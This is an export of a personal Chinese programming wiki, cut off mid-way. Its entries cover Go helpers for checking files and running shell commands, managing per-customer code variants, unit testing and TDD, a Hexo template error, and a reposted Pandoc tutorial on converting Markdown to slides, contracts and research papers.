判断文件是否存在12345678910func PathExists(path string) (bool, error) { _, err := os.Stat(path) if err == nil { return true, nil } if os.IsNotExist(err) { return false, nil } return false, err} 在go中执行命令 via: https://stackoverflow.com/questions/6182369/exec-a-shell-command-in-go 12345678910111213141516171819202122232425262728293031package mainimport ( \"bytes\" \"fmt\" \"log\" \"os/exec\")const ShellToUse = \"bash\"func Shellout(command string) (error, string, string) { var stdout bytes.Buffer var stderr bytes.Buffer cmd := exec.Command(ShellToUse, \"-c\", command) cmd.Stdout = &stdout cmd.Stderr = &stderr err := cmd.Run() return err, stdout.String(), stderr.String()}func main() { err, out, errout := Shellout(\"ls -ltr\") if err != nil { log.Printf(\"error: %v\\n\", err) } fmt.Println(\"--- stdout ---\") fmt.Println(out) fmt.Println(\"--- stderr ---\") fmt.Println(errout)} 直接输出到stdout上： 12345678func Shellout(command string) (error) { //var stdout bytes.Buffer cmd := exec.Command(ShellToUse, \"-c\", command) cmd.Stdout = os.Stdout cmd.Stderr = os.Stdout err := cmd.Run() return err}","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"},{"name":"go","slug":"计算机/编程/go","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/go/"}]},{"title":"多目标","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/软件工程/多目标/","text":"如何管理多个目标间逻辑的差异，即custom部分逻辑导致业务代码膨胀的问题。 google git 定制功能 这段描述和我们遇到的问题类似 由于同一个项目需要提供给不同的客户，同时不同的客户又有各自定制的功能。即一个项目，多个不同的定制版本的模式。因此引发了多个版本管理的问题。如果每个定制版本都一份代码，对于代码的维护将会非常困难，因此共用一份代码是必须的。 最开始，由于定制版本不多，差异也不大，所以通过设定一个静态值来表示不同的定制版，再由运行时决定功能逻辑。后来，随着定制版本增多、各版本之间的逻辑差异加大，导致版本判断的代码越来越多，逻辑越来越复杂。由于冗余代码的增加，维护也越来越困难。因此，代码的管理方案也需要相应的改变。首先想到的是通过SVN等版本管理工具进行管理，将基础版本作为主干，各定制版本在分支上开发。在一个分支上添加了公共功能或者是修复了公共功能部分的BUG时，再将代码合并到主干，其它分支再到主干上同步。这是一个优秀的解决方案，但是在公共部分的代码更新频繁的情况下，这个方案会导致频繁的分支同步与合并。虽然在改动量小的时候，及时更新同步可以有效解决合并困难的问题。 作者：宅男9号链接：https://www.jianshu.com/p/c604c3feaee2來源：简书简书著作权归作者所有，任何形式的转载都请联系作者获得授权并注明出处。 放到具体场景中，一个简单的例子就是：page_main中不同产品(A/B/C)的逻辑不一样： 12345678910if (oem_pid == PRODUCT_A) { }else if (oem_pid == PRODUCT_B) {}else if (...) { ...} 产品多起来后，这些代码就越来越难以维护。 方法1. 在不同分支里管理逻辑差异，但在合并公共特性代码时很难管理，会花费大量人力。 方法2. 类似方法1，提出一个公共特性core的submodule 方法3. 合理模块划分，产品定制部分作为一个插件（但放我们这，这些逻辑并不是有具体定义的定制功能块） 相关问题大致的思路还是通过工程架构，合理划分模块，隔离 使用git的分支功能实现定制功能摘取与组合的想法https://www.cnblogs.com/bee0060/p/3487213.html Git多个分支如何正确的共享代码，并且保持分支独有的代码?https://www.zhihu.com/question/65888370/answer/240089470https://www.v2ex.com/t/393932","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"软件工程","slug":"计算机/软件工程","permalink":"http://wiki.noodlefighter.com/categories/计算机/软件工程/"}]},{"title":"测试","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/软件工程/测试/","text":"TODO 太乱，整理 基本理论软件测试-理论常识篇http://www.lai18.com/content/461008.html 使用unity进行测试驱动开发http://www.lai18.com/content/2335228.html mock介绍http://baidutech.blog.51cto.com/4114344/743740/ 相关工具http://blog.csdn.net/jiayanhui2877/article/details/8727193gcc内建gcov工具代码覆盖率 http://blog.csdn.net/windone0109/article/details/15814653http://rdc.hundsun.com/portal/article/704.html覆盖率相关工具 http://www.throwtheswitch.org/build/build-unityhttp://www.throwtheswitch.org/build/which http://www.it1352.com/494486.html tag: 敏捷开发 单元测试 单元测试和TDD从测试的颗粒度开始谈单元测试根据测试的颗粒度划分, 测试可以分为: 单元测试: 白盒地由开发人员自行编写的测试, 看组成模块的各部件工作是否正常. 集成测试(功能测试/系统测试): 灰盒地把各模块放一起联调, 可以很容易检查出模块间接口不匹配的问题. 验收测试: 黑盒地根据用户需求进行测试. TDDTDD(Test Driven Development以及Test Driven Design)是一种开发模式, 提倡先写测试用例后实现, 也就是开发人员拿到需求之后, 先设计接口, 确定了怎么使用之后再着手实现. 对于开发人员, TDD带来的最直观的好处是写程序的过程中可以步进地看到程序建立起来, 也就是能得到快速的反馈, 把注意力集中到”实现目标”上而不是纠结与它的实现细节. 同时, TDD促进了解耦, 因为TDD会迫使程序设计成可测试的, 而可测试的程序必须减少耦合. TDD实践: 建立一个能独立编译的测试用例 根据需求, 设计接口, 写测试用例 以跑通测试用例为目标, 编写实现 我的理解, 对于一整个项目, TDD开发的测试用例可以是一些功能测试(敏捷开发里提到的”验收测试”, 比如最终产品是一些API, 则对API进行测试); 对于项目中的各个模块, 测试用例就是开发人员自己编写的单元测试了. 单元测试的独立性和非入侵性脱离依赖","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"软件工程","slug":"计算机/软件工程","permalink":"http://wiki.noodlefighter.com/categories/计算机/软件工程/"}]},{"title":"管理多个构建目标的逻辑差异","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/软件工程/管理多个构建目标的逻辑差异/","text":"TODO 如何管理多个目标间逻辑的差异，即custom部分逻辑导致业务代码膨胀的问题。 google git 定制功能 这段描述和我们遇到的问题类似 由于同一个项目需要提供给不同的客户，同时不同的客户又有各自定制的功能。即一个项目，多个不同的定制版本的模式。因此引发了多个版本管理的问题。如果每个定制版本都一份代码，对于代码的维护将会非常困难，因此共用一份代码是必须的。 最开始，由于定制版本不多，差异也不大，所以通过设定一个静态值来表示不同的定制版，再由运行时决定功能逻辑。后来，随着定制版本增多、各版本之间的逻辑差异加大，导致版本判断的代码越来越多，逻辑越来越复杂。由于冗余代码的增加，维护也越来越困难。因此，代码的管理方案也需要相应的改变。首先想到的是通过SVN等版本管理工具进行管理，将基础版本作为主干，各定制版本在分支上开发。在一个分支上添加了公共功能或者是修复了公共功能部分的BUG时，再将代码合并到主干，其它分支再到主干上同步。这是一个优秀的解决方案，但是在公共部分的代码更新频繁的情况下，这个方案会导致频繁的分支同步与合并。虽然在改动量小的时候，及时更新同步可以有效解决合并困难的问题。 作者：宅男9号链接：https://www.jianshu.com/p/c604c3feaee2來源：简书简书著作权归作者所有，任何形式的转载都请联系作者获得授权并注明出处。 放到具体场景中，一个简单的例子就是：page_main中不同产品(A/B/C)的逻辑不一样： 12345678910if (oem_pid == PRODUCT_A) { }else if (oem_pid == PRODUCT_B) {}else if (...) { ...} 产品多起来后，这些代码就越来越难以维护。 方法1. 在不同分支里管理逻辑差异，但在合并公共特性代码时很难管理，会花费大量人力。 方法2. 类似方法1，提出一个公共特性core的submodule 方法3. 合理模块划分，产品定制部分作为一个插件（但放我们这，这些逻辑并不是有具体定义的定制功能块） 相关问题大致的思路还是通过工程架构，合理划分模块，隔离 使用git的分支功能实现定制功能摘取与组合的想法https://www.cnblogs.com/bee0060/p/3487213.html Git多个分支如何正确的共享代码，并且保持分支独有的代码?https://www.zhihu.com/question/65888370/answer/240089470https://www.v2ex.com/t/393932","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"软件工程","slug":"计算机/软件工程","permalink":"http://wiki.noodlefighter.com/categories/计算机/软件工程/"}]},{"title":"hexo","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/通用技术/hexo/","text":"Hexo 的 Template render error 错误 via:https://52heartz.top/articles/hexo-template-render-error/ 作者: 52Heartz 原因可能有如下两种: 在 `.md` 源文件中出现了没有闭合的双括号，如单独的 `{{` 或者单独的 `}}`，或者出现了闭合的但是中间为空的双括号，如 `{{}}` 。 在 `.md` 源文件中出现了没有闭合的标签插件（Tag Plugins）。如只有 `{% xxx %}`，但却没有 `{% endxxx %}`。 更深层的原因是， {{ 和 }} ，以及 {% %} 是 Hexo 模板中的标签，Hexo 处理源文件的时候会对这些标签进行解析，但是单独写的或者使用不支持的标签就会导致解析错误。 如果确实需要在文章中呈现出双括号或者括号加百分号这样的文字，可以直接在源文件中使用 1{% raw %} 和 1{% endraw %}","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"通用技术","slug":"计算机/通用技术","permalink":"http://wiki.noodlefighter.com/categories/计算机/通用技术/"}]},{"title":"pandoc","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/通用技术/pandoc/","text":"https://linux.cn/article-10228-1.htmlhttps://linux.cn/article-10179-1.html 比如生成ppt 在命令行使用 Pandoc 进行文件转换 作者： Kiko Fernandez-reyes 译者： LCTT jlztan 转载自：https://linux.cn/article-10228-1.html 这篇指南介绍如何使用 Pandoc 将文档转换为多种不同的格式。 Pandoc 是一个命令行工具，用于将文件从一种标记语言转换为另一种标记语言。标记语言使用标签来标记文档的各个部分。常用的标记语言包括 Markdown、ReStructuredText、HTML、LaTex、ePub 和 Microsoft Word DOCX。 简单来说，Pandoc 允许你将一些文件从一种标记语言转换为另一种标记语言。典型的例子包括将 Markdown 文件转换为演示文稿、LaTeX，PDF 甚至是 ePub。 本文将解释如何使用 Pandoc 从单一标记语言（在本文中为 Markdown）生成多种格式的文档，引导你完成从 Pandoc 安装，到展示如何创建多种类型的文档，再到提供有关如何编写易于移植到其他格式的文档的提示。 文中还将解释使用元信息文件对文档内容和元信息（例如，作者姓名、使用的模板、书目样式等）进行分离的意义。 Pandoc 安装和要求Pandoc 默认安装在大多数 Linux 发行版中。本教程使用 pandoc-2.2.3.2 和 pandoc-citeproc-0.14.3。如果不打算生成 PDF，那么这两个包就足够了。但是，我建议也安装 texlive，这样就可以选择生成 PDF 了。 通过以下命令在 Linux 上安装这些程序： 1sudo apt-get install pandoc pandoc-citeproc texlive 您可以在 Pandoc 的网站上找到其他平台的 安装说明。 我强烈建议安装 pandoc-crossref，这是一个“用于对图表，方程式，表格和交叉引用进行编号的过滤器”。最简单的安装方式是下载 预构建的可执行文件，但也可以通过以下命令从 Haskell 的软件包管理器 cabal 安装它： 12cabal updatecabal install pandoc-crossref 如果需要额外的 Haskell 安装信息，请参考 pandoc-crossref 的 GitHub 仓库。 几个例子我将通过解释如何生成三种类型的文档来演示 Pandoc 的工作原理： 由包含数学公式的 LaTeX 文件创建的网页 由 Markdown 文件生成的 Reveal.js 幻灯片 混合 Markdown 和 LaTeX 的合同文件 创建一个包含数学公式的网站Pandoc 的优势之一是以不同的输出文件格式显示数学公式。例如，我们可以从包含一些数学符号（用 LaTeX 编写）的 LaTeX 文档（名为 math.tex）生成一个网页。 math.tex 文档如下所示： 123456789% Pandoc math demos$a^2 + b^2 = c^2$$v(t) = v_0 + \\frac{1}{2}at^2$$\\gamma = \\frac{1}{\\sqrt{1 - v^2/c^2}}$$\\exists x \\forall y (Rxy \\equiv Ryx)$$p \\wedge q \\models p$$\\Box\\diamond p\\equiv\\diamond p$$\\int_{0}^{1} x dx = \\left[ \\frac{1}{2}x^2 \\right]_{0}^{1} = \\frac{1}{2}$$e^x = \\sum_{n=0}^\\infty \\frac{x^n}{n!} = \\lim_{n\\rightarrow\\infty} (1+x/n)^n$ 通过输入以下命令将 LaTeX 文档转换为名为 mathMathML.html 的网站： 1pandoc math.tex -s --mathml -o mathMathML.html 参数 -s 告诉 Pandoc 生成一个独立的网页（而不是网页片段，因此它将包括 HTML 中的 head 和 body 标签），-mathml 参数强制 Pandoc 将 LaTeX 中的数学公式转换成 MathML，从而可以由现代浏览器进行渲染。 看一下 网页效果 和 代码，代码仓库中的 Makefile 使得运行更加简单。 制作一个 Reveal.js 幻灯片使用 Pandoc 从 Markdown 文件生成简单的演示文稿很容易。幻灯片包含顶级幻灯片和下面的嵌套幻灯片。可以通过键盘控制演示文稿，从一个顶级幻灯片跳转到下一个顶级幻灯片，或者显示顶级幻灯片下面的嵌套幻灯片。 这种结构在基于 HTML 的演示文稿框架中很常见。 创建一个名为 SLIDES 的幻灯片文档（参见 代码仓库）。首先，在 ％ 后面添加幻灯片的元信息（例如，标题、作者和日期）： 123% Case Study% Kiko Fernandez Reyes% Sept 27, 2017 这些元信息同时也创建了第一张幻灯片。要添加更多幻灯片，使用 Markdown 的一级标题（在下面例子中的第5行，参考 Markdown 的一级标题 ）生成顶级幻灯片。 例如，可以通过以下命令创建一个标题为 “Case Study”、顶级幻灯片名为 “Wine Management System” 的演示文稿： 1234% Case Study% Kiko Fernandez Reyes% Sept 27, 2017# Wine Management System 使用 Markdown 的二级标题将内容（比如包含一个新管理系统的说明和实现的幻灯片）放入刚刚创建的顶级幻灯片。下面添加另外两张幻灯片（在下面例子中的第 7 行和 14 行 ，参考 Markdown 的二级标题 ）。 第一个二级幻灯片的标题为 “Idea”，并显示瑞士国旗的图像 第二个二级幻灯片的标题为 “Implementation” 1% Case Study% Kiko Fernandez Reyes% Sept 27, 2017# Wine Management System## Idea## Implementation 我们现在有一个顶级幻灯片（＃Wine Management System），其中包含两张幻灯片（## Idea 和 ## Implementation）。 通过创建一个由符号 > 开头的 Markdown 列表，在这两张幻灯片中添加一些内容。在上面代码的基础上，在第一张幻灯片中添加两个项目（第 9-10 行），第二张幻灯片中添加五个项目（第 16-20 行）： 123456% Case Study% Kiko Fernandez Reyes% Sept 27, 2017# Wine Management System## Idea## Implementationxxxxxxxxxx % Case Study% Kiko Fernandez Reyes% Sept 27, 2017# Wine Management System## Idea## Implementation% Case Study% Kiko Fernandez Reyes% Sept 27, 2017# Wine Management System## Idea>- Swiss love their **wine** and cheese>- Create a *simple* wine tracker system![](img/matterhorn.jpg)## Implementation>- Bottles have a RFID tag>- RFID reader (emits and read signal)>- **Raspberry Pi**>- **Server (online shop)**>- Mobile app 上面的代码添加了马特洪峰的图像，也可以使用纯 Markdown 语法或添加 HTML 标签来改进幻灯片。 要生成幻灯片，Pandoc 需要引用 Reveal.js 库，因此它必须与 SLIDES 文件位于同一文件夹中。生成幻灯片的命令如下所示： 12pandoc -t revealjs -s --self-contained SLIDES \\-V theme=white -V slideNumber=true -o index.html 上面的 Pandoc 命令使用了以下参数： -t revealjs 表示将输出一个 revealjs 演示文稿 -s 告诉 Pandoc 生成一个独立的文档 --self-contained 生成没有外部依赖关系的 HTML 文件 -V 设置以下变量： theme=white 将幻灯片的主题设为白色 slideNumber=true 显示幻灯片编号 -o index.html 在名为 index.html 的文件中生成幻灯片 为了简化操作并避免键入如此长的命令，创建以下 Makefile： 1234567all: generategenerate: pandoc -t revealjs -s --self-contained SLIDES \\ -V theme=white -V slideNumber=true -o index.htmlclean: index.html rm index.html.PHONY: all clean generate 可以在 这个仓库 中找到所有代码。 制作一份多种格式的合同假设你正在准备一份文件，并且（这样的情况现在很常见）有些人想用 Microsoft Word 格式，其他人使用自由软件，想要 ODT 格式，而另外一些人则需要 PDF。你不必使用 OpenOffice 或 LibreOffice 来生成 DOCX 或 PDF 格式的文件，可以用 Markdown 创建一份文档（如果需要高级格式，可以使用一些 LaTeX 语法），并生成任何这些文件类型。 和以前一样，首先声明文档的元信息（标题、作者和日期）： 123% Contract Agreement for Software X% Kiko Fernandez-Reyes% August 28th, 2018 然后在 Markdown 中编写文档（如果需要高级格式，则添加 LaTeX）。例如，创建一个固定间隔的表格（在 LaTeX 中用 \\hspace{3cm} 声明）以及客户端和承包商应填写的行（在 LaTeX 中用 \\hrulefill 声明）。之后，添加一个用 Markdown 编写的表格。 创建的文档如下所示： 创建此文档的代码如下： 1234567891011121314151617181920212223242526272829303132333435% Contract Agreement for Software X% Kiko Fernandez-Reyes% August 28th, 2018...### Work Order\\begin{table}[h]\\begin{tabular}{ccc}The Contractor & \\hspace{3cm} & The Customer \\\\& & \\\\& & \\\\\\hrulefill & \\hspace{3cm} & \\hrulefill \\\\%Name & \\hspace{3cm} & Name \\\\& & \\\\& & \\\\\\hrulefill & \\hspace{3cm} & \\hrulefill \\\\...\\end{tabular}\\end{table}\\vspace{1cm}+--------------------------------------------|----------|-------------+| Type of Service | Cost | Total |+:===========================================+=========:+:===========:+| Game Engine | 70.0 | 70.0 || | | |+--------------------------------------------|----------|-------------+| | | |+--------------------------------------------|----------|-------------+| Extra: Comply with defined API functions | 10.0 | 10.0 || and expected returned format | | |+--------------------------------------------|----------|-------------+| | | |+--------------------------------------------|----------|-------------+| **Total Cost** | | **80.0** |+--------------------------------------------|----------|-------------+ 要生成此文档所需的三种不同输出格式，编写如下的 Makefile： 12345678DOCS=contract-agreement.mdall: $(DOCS) pandoc -s $(DOCS) -o $(DOCS:md=pdf) pandoc -s $(DOCS) -o $(DOCS:md=docx) pandoc -s $(DOCS) -o $(DOCS:md=odt)clean: rm *.pdf *.docx *.odt.PHONY: all clean 4 到 7 行是生成三种不同输出格式的具体命令： 如果有多个 Markdown 文件并想将它们合并到一个文档中，需要按照希望它们出现的顺序编写命令。例如，在撰写本文时，我创建了三个文档：一个介绍文档、三个示例和一些高级用法。以下命令告诉 Pandoc 按指定的顺序将这些文件合并在一起，并生成一个名为 document.pdf 的 PDF 文件。 1pandoc -s introduction.md examples.md advanced-uses.md -o document.pdf 模板和元信息编写复杂的文档并非易事，你需要遵循一系列独立于内容的规则，例如使用特定的模板、编写摘要、嵌入特定字体，甚至可能要声明关键字。所有这些都与内容无关：简单地说，它就是元信息。 Pandoc 使用模板生成不同的输出格式。例如，有一个 LaTeX 的模板，还有一个 ePub 的模板，等等。这些模板的元信息中有未赋值的变量。使用以下命令找出 Pandoc 模板中可用的元信息： 1pandoc -D FORMAT 例如，LaTex 的模版是： 1pandoc -D latex 按照以下格式输出： 123456789101112131415161718192021222324$if(title)$\\title{$title$$if(thanks)$\\thanks{$thanks$}$endif$}$endif$$if(subtitle)$\\providecommand{\\subtitle}[1]{}\\subtitle{$subtitle$}$endif$$if(author)$\\author{$for(author)$$author$$sep$ \\and $endfor$}$endif$$if(institute)$\\providecommand{\\institute}[1]{}\\institute{$for(institute)$$institute$$sep$ \\and $endfor$}$endif$\\date{$date$}$if(beamer)$$if(titlegraphic)$\\titlegraphic{\\includegraphics{$titlegraphic$}}$endif$$if(logo)$\\logo{\\includegraphics{$logo$}}$endif$$endif$\\begin{document} 如你所见，输出的内容中有标题、致谢、作者、副标题和机构模板变量（还有许多其他可用的变量）。可以使用 YAML 元区块轻松设置这些内容。 在下面例子的第 1-5 行中，我们声明了一个 YAML 元区块并设置了一些变量（使用上面合同协议的例子）： 123456---title: Contract Agreement for Software Xauthor: Kiko Fernandez-Reyesdate: August 28th, 2018---(continue writing document as in the previous example) 这样做非常奏效，相当于以前的代码： 123% Contract Agreement for Software X% Kiko Fernandez-Reyes% August 28th, 2018 然而，这样做将元信息与内容联系起来，也即 Pandoc 将始终使用此信息以新格式输出文件。如果你将要生成多种文件格式，最好要小心一点。例如，如果你需要以 ePub 和 HTML 的格式生成合同，并且 ePub 和 HTML 需要不同的样式规则，该怎么办？ 考虑一下这些情况： 如果你只是尝试嵌入 YAML 变量 css:style-epub.css，那么将从 HTML 版本中移除该变量。这不起作用。 复制文档显然也不是一个好的解决方案，因为一个版本的更改不会与另一个版本同步。 你也可以像下面这样将变量添加到 Pandoc 命令中： 1pandoc -s -V css=style-epub.css document.md document.epubpandoc -s -V css=style-html.css document.md document.html 我的观点是，这样做很容易从命令行忽略这些变量，特别是当你需要设置数十个变量时（这可能出现在编写复杂文档的情况中）。现在，如果将它们放在同一文件中（meta.yaml 文件），则只需更新或创建新的元信息文件即可生成所需的输出格式。然后你会编写这样的命令： 12pandoc -s -V css=style-epub.css document.md document.epubpandoc -s -V css=style-html.css document.md document.html 这是一个更简洁的版本，你可以从单个文件更新所有元信息，而无需更新文档的内容。 结语通过以上的基本示例，我展示了 Pandoc 在将 Markdown 文档转换为其他格式方面是多么出色。 用 Pandoc 生成一篇调研论文 作者： Kiko Fernandez-reyes 译者： LCTT dianbanjiu 转载自：https://linux.cn/article-10179-1.html 学习如何用 Markdown 管理章节引用、图像、表格以及更多。 这篇文章对于使用 Markdown 语法做一篇调研论文进行了一个深度体验。覆盖了如何创建和引用章节、图像（用 Markdown 和 LaTeX）和参考书目。我们也讨论了一些棘手的案例和为什么使用 LaTex 是一个正确的做法。 调研调研论文一般包括对章节、图像、表格和参考书目的引用。Pandoc 本身并不能交叉引用这些，但是它能够利用 pandoc-crossref 过滤器来完成自动编号和章节、图像、表格的交叉引用。 让我们从重写原本以 LaTax 撰写的 一个教育调研报告的例子 开始，然后用 Markdown（和一些 LaTax）、Pandoc 和 Pandoc-crossref 重写。 添加并引用章节要想章节被自动编号，必须使用 Markdown H1 标题编写。子章节使用 H2-H4 子标题编写（通常不需要更多级别了）。例如一个章节的标题是 “Implementation”，写作 `# Implementation {#sec: implementation}`，然后 Pandoc 会把它转化为 `3. Implementation`（或者转换为相应的章节编号）。`Implementation` 这个标题使用了 H1 并且声明了一个 `{#sec: implementation}` 的标签，这是作者用于引用该章节的标签。要想引用一个章节，输入 `@` 符号并跟上对应章节标签，使用方括号括起来即可： `[@ sec:implementation]` 在这篇论文中, 我们发现了下面这个例子： 1we lack experience (consistency between TAs, [@sec:implementation]). Pandoc 转换： 1we lack experience (consistency between TAs, Section 4). 章节被自动编号（这在本文最后的 Makefile 当中说明）。要创建无编号的章节，输入章节的标题并在最后添加 {-}。例如：### Designing a game for maintainability {-} 就以标题 “Designing a game for maintainability”，创建了一个无标号的章节。 添加并引用图像添加并引用一个图像，跟添加并引用一个章节和添加一个 Markdown 图片很相似： 1![Scatterplot matrix](data/scatterplots/RScatterplotMatrix2.png){#fig:scatter-matrix} 上面这一行是告诉 Pandoc，有一个标有 Scatterplot matrix 的图像以及这张图片路径是 `data/scatterplots/RScatterplotMatrix2.png`。`{#fig:scatter-matrix}` 表明了用于引用该图像的名字。 这里是从一篇论文中进行图像引用的例子： 1The boxes \"Enjoy\", \"Grade\" and \"Motivation\" ([@fig:scatter-matrix]) ... Pandoc 产生如下输出： 1The boxes \"Enjoy\", \"Grade\" and \"Motivation\" (Fig. 1) ... 添加及引用参考书目大多数调研报告都把引用放在一个 BibTeX 的数据库文件中。在这个例子中，该文件被命名为 biblio.bib，它包含了论文中所有的引用。下面是这个文件的样子： 123456789101112131415161718192021222324@inproceedings{wrigstad2017mastery, Author = {Wrigstad, Tobias and Castegren, Elias}, Booktitle = {SPLASH-E}, Title = {Mastery Learning-Like Teaching with Achievements}, Year = 2017}@inproceedings{review-gamification-framework, Author = {A. Mora and D. Riera and C. Gonzalez and J. Arnedo-Moreno}, Publisher = {IEEE}, Booktitle = {2015 7th International Conference on Games and Virtual Worlds for Serious Applications (VS-Games)}, Doi = {10.1109/VS-GAMES.2015.7295760}, Keywords = {formal specification;serious games (computing);design framework;formal design process;game components;game design elements;gamification design frameworks;gamification-based solutions;Bibliographies;Context;Design methodology;Ethics;Games;Proposals}, Month = {Sept}, Pages = {1-8}, Title = {A Literature Review of Gamification Design Frameworks}, Year = 2015, Bdsk-Url-1 = {http://dx.doi.org/10.1109/VS-GAMES.2015.7295760}}... 第一行的 @inproceedings{wrigstad2017mastery, 表明了出版物 的类型（inproceedings），以及用来指向那篇论文的标签（wrigstad2017mastery）。 引用这篇题为 “Mastery Learning-Like Teaching with Achievements” 的论文, 输入： 1the achievement-driven learning methodology [@wrigstad2017mastery] Pandoc 将会输出： 1the achievement- driven learning methodology [30] 这篇论文将会产生像下面这样被标号的参考书目： 引用文章的集合也很容易：只要引用使用分号 ; 分隔开被标记的参考文献就可以了。如果一个引用有两个标签 —— 例如： SEABORN201514 和 gamification-leaderboard-benefits—— 像下面这样把它们放在一起引用： 12Thus, the most important benefit is its potential to increase students' motivationand engagement [@SEABORN201514;@gamification-leaderboard-benefits]. Pandoc 将会产生： 12Thus, the most important benefit is its potential to increase students’ motivationand engagement [26, 28] 问题案例一个常见的问题是所需项目与页面不匹配。不匹配的部分会自动移动到它们认为合适的地方，即便这些位置并不是读者期望看到的位置。因此在图像或者表格接近于它们被提及的地方时，我们需要调节一下那些元素放置的位置，使得它们更加易于阅读。为了达到这个效果，我建议使用 figure 这个 LaTeX 环境参数，它可以让用户控制图像的位置。 我们看一个上面提到的图像的例子： 1![Scatterplot matrix](data/scatterplots/RScatterplotMatrix2.png){#fig:scatter-matrix} 然后使用 LaTeX 重写： 1234\\begin{figure}[t]\\includegraphics{data/scatterplots/RScatterplotMatrix2.png}\\caption{\\label{fig:matrix}Scatterplot matrix}\\end{figure} 在 LaTeX 中，figure 环境参数中的 [t] 选项表示这张图用该位于该页的最顶部。有关更多选项，参阅 LaTex/Floats, Figures, and Captions 这篇 Wikibooks 的文章。 产生一篇论文到目前为止，我们讲了如何添加和引用（子）章节、图像和参考书目，现在让我们重温一下如何生成一篇 PDF 格式的论文。要生成 PDF，我们将使用 Pandoc 生成一篇可以被构建成最终 PDF 的 LaTeX 文件。我们还会讨论如何以 LaTeX，使用一套自定义的模板和元信息文件生成一篇调研论文，以及如何将 LaTeX 文档编译为最终的 PDF 格式。 很多会议都提供了一个 .cls 文件或者一套论文应有样式的模板；例如，它们是否应该使用两列的格式以及其它的设计风格。在我们的例子中，会议提供了一个名为 acmart.cls 的文件。 作者通常想要在他们的论文中包含他们所属的机构，然而，这个选项并没有包含在默认的 Pandoc 的 LaTeX 模板（注意，可以通过输入 pandoc -D latex 来查看 Pandoc 模板）当中。要包含这个内容，找一个 Pandoc 默认的 LaTeX 模板，并添加一些新的内容。将这个模板像下面这样复制进一个名为 mytemplate.tex 的文件中： 1pandoc -D latex > mytemplate.tex 默认的模板包含以下代码： 1234567$if(author)$\\author{$for(author)$$author$$sep$ \\and $endfor$}$endif$$if(institute)$\\providecommand{\\institute}[1]{}\\institute{$for(institute)$$institute$$sep$ \\and $endfor$}$endif$ 因为这个模板应该包含作者的联系方式和电子邮件地址，在其他一些选项之间，我们更新这个模板以添加以下内容（我们还做了一些其他的更改，但是因为文件的长度，就没有包含在此处）： 1234567891011121314latex$for(author)$ $if(author.name)$ \\author{$author.name$} $if(author.affiliation)$ \\affiliation{\\institution{$author.affiliation$}} $endif$ $if(author.email)$ \\email{$author.email$} $endif$ $else$ $author$ $endif$$endfor$ 要让这些更改起作用，我们还应该有下面的文件： main.md 包含调研论文 biblio.bib 包含参考书目数据库 acmart.cls 我们使用的文档的集合 mytemplate.tex 是我们使用的模板文件（代替默认的） 让我们添加论文的元信息到一个 meta.yaml 文件： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647---template: 'mytemplate.tex'documentclass: acmartclassoption: sigconftitle: The impact of opt-in gamification on `\\\\`{=latex} students' grades in a software design courseauthor:- name: Kiko Fernandez-Reyes affiliation: Uppsala University email: kiko.fernandez@it.uu.se- name: Dave Clarke affiliation: Uppsala University email: dave.clarke@it.uu.se- name: Janina Hornbach affiliation: Uppsala University email: janina.hornbach@fek.uu.sebibliography: biblio.bibabstract: | An achievement-driven methodology strives to give students more control over their learning with enough flexibility to engage them in deeper learning. (more stuff continues)include-before: | \\` ``{=latex} \\copyrightyear{2018} \\acmYear{2018} \\setcopyright{acmlicensed} \\acmConference[MODELS '18 Companion]{ACM/IEEE 21th International Conference on Model Driven Engineering Languages and Systems}{October 14--19, 2018}{Copenhagen, Denmark} \\acmBooktitle{ACM/IEEE 21th International Conference on Model Driven Engineering Languages and Systems (MODELS '18 Companion), October 14--19, 2018, Copenhagen, Denmark} \\acmPrice{XX.XX} \\acmDOI{10.1145/3270112.3270118} \\acmISBN{978-1-4503-5965-8/18/10} \\begin{CCSXML} 10010405.10010489 Applied computing~Education 500 \\end{CCSXML} \\ccsdesc[500]{Applied computing~Education} \\keywords{gamification, education, software design, UML} \\` ``figPrefix: - \"Fig.\" - \"Figs.\"secPrefix: - \"Section\" - \"Sections\"... 这个元信息文件使用 LaTeX 设置下列参数： template 指向使用的模板（mytemplate.tex） documentclass 指向使用的 LaTeX 文档集合（acmart） classoption 是在 sigconf 的案例中，指向这个类的选项 title 指定论文的标题 author 是一个包含例如 name、affiliation 和 email 的地方 bibliography 指向包含参考书目的文件（biblio.bib） abstract 包含论文的摘要 include-before 是这篇论文的具体内容之前应该被包含的信息；在 LaTeX 中被称为 前言。我在这里包含它去展示如何产生一篇计算机科学的论文，但是你可以选择跳过 figPrefix 指向如何引用文档中的图像，例如：当引用图像的 [@fig:scatter-matrix] 时应该显示什么。例如，当前的 figPrefix 在这个例子 The boxes \"Enjoy\", \"Grade\" and \"Motivation\" ([@fig:scatter-matrix])中，产生了这样的输出：The boxes \"Enjoy\", \"Grade\" and \"Motivation\" (Fig. 3)。如果这里有很多图像，目前的设置表明它应该在图像号码旁边显示 Figs. secPrefix 指定如何引用文档中其他地方提到的部分（类似之前的图像和概览） 现在已经设置好了元信息，让我们来创建一个 Makefile，它会产生你想要的输出。Makefile 使用 Pandoc 产生 LaTeX 文件，pandoc-crossref 产生交叉引用，pdflatex 构建 LaTeX 为 PDF，bibtex 处理引用。 Makefile 已经展示如下： 1234567891011all: paperpaper: @pandoc -s -F pandoc-crossref --natbib meta.yaml --template=mytemplate.tex -N \\ -f markdown -t latex+raw_tex+tex_math_dollars+citations -o main.tex main.md @pdflatex main.tex &> /dev/null @bibtex main &> /dev/null @pdflatex main.tex &> /dev/null @pdflatex main.tex &> 